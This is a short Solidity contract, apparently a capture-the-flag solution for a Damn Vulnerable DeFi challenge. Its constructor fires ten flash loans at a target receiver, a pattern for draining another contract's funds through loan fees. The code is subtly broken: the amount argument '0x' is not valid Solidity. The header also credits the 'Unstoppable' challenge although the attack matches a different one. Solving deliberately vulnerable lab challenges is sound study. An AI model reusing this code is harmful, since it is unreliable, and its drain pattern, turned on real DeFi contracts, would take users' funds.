// SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity ^0.8.0;
// This smart contract implements an Attack Unstoppable challenge from Damn Vulnerable Defi.
interface IPool{
     function flashLoan(address receiver, address token, uint256 amount, bytes calldata data) external returns (bool);
}
contract AttackUnstoppable {
   
    address private constant addressjs = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
    
    constructor(address pool_address, address target) {
        // Perform a loop to crate multiple flash loans
        for(uint256 count = 0; count < 10; count++) {
            IPool(pool_address).flashLoan(target, addressjs, 0x, "");
        }
    }
}
